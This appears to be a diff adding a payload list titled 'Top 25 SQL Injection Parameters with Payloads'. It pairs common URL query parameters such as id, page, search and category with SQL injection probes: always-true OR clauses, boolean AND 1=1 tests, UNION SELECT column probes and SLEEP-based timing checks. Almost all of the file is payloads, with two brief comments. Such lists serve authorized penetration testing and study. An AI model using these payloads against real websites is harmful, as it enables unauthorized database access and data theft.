@@ -1,0 +1,77 @@
+#Top 25 SQL Injection Parameters with Payloads
+?id=1' OR '1'='1
+?page=1' OR '1'='1
+?dir=1' OR '1'='1
+?search=1' OR '1'='1
+?category=1' OR '1'='1
+?class=1' OR '1'='1
+?file=1' OR '1'='1
+?url=1' OR '1'='1
+?news=1' OR '1'='1
+?item=1' OR '1'='1
+?menu=1' OR '1'='1
+?lang=1' OR '1'='1
+?name=1' OR '1'='1
+?ref=1' OR '1'='1
+?title=1' OR '1'='1
+?view=1' OR '1'='1
+?topic=1' OR '1'='1
+?thread=1' OR '1'='1
+?type=1' OR '1'='1
+?date=1' OR '1'='1
+?form=1' OR '1'='1
+?join=1' OR '1'='1
+?main=1' OR '1'='1
+?nav=1' OR '1'='1
+?region=1' OR '1'='1
+
+
+?id=1' AND 1=1--
+?id=1' AND 1=2--  (Testing for error-based injections)
+?page=1' AND 1=1--
+?dir=1' AND 1=2--  
+?search=1' AND 1=1--
+?category=1' AND 1=1--
+?class=1' AND 1=1--
+?file=1' AND 1=1--
+?url=1' AND 1=1--
+?news=1' AND 1=1--
+?item=1' AND 1=1--
+?menu=1' AND 1=1--
+?lang=1' AND 1=1--
+?name=1' AND 1=1--
+?ref=1' AND 1=1--
+?title=1' AND 1=1--
+?view=1' AND 1=1--
+?topic=1' AND 1=1--
+?thread=1' AND 1=1--
+?type=1' AND 1=1--
+?date=1' AND 1=1--
+?form=1' AND 1=1--
+?join=1' AND 1=1--
+?main=1' AND 1=1--
+?nav=1' AND 1=1--
+?region=1' AND 1=1--
+
+
+?id=1' UNION SELECT null, null, null--
+?page=1' UNION SELECT null, null, null--
+?dir=1' UNION SELECT null, null, null--
+?search=1' UNION SELECT null, null, null--
+?category=1' UNION SELECT null, null, null--
+?class=1' UNION SELECT null, null, null--
+?file=1' UNION SELECT null, null, null--
+?url=1' UNION SELECT null, null, null--
+
+
+?id=1' AND SLEEP(5)-- (Delays to test if injection is successful)
+?page=1' AND SLEEP(5)--
+?dir=1' AND SLEEP(5)--
+?search=1' AND SLEEP(5)--
+?category=1' AND SLEEP(5)--
+?class=1' AND SLEEP(5)--
+?file=1' AND SLEEP(5)--
+
+
+?id=1' AND 1=0 UNION SELECT 1,2,3--
+?page=1' AND 1=0 UNION SELECT 1,2,3--
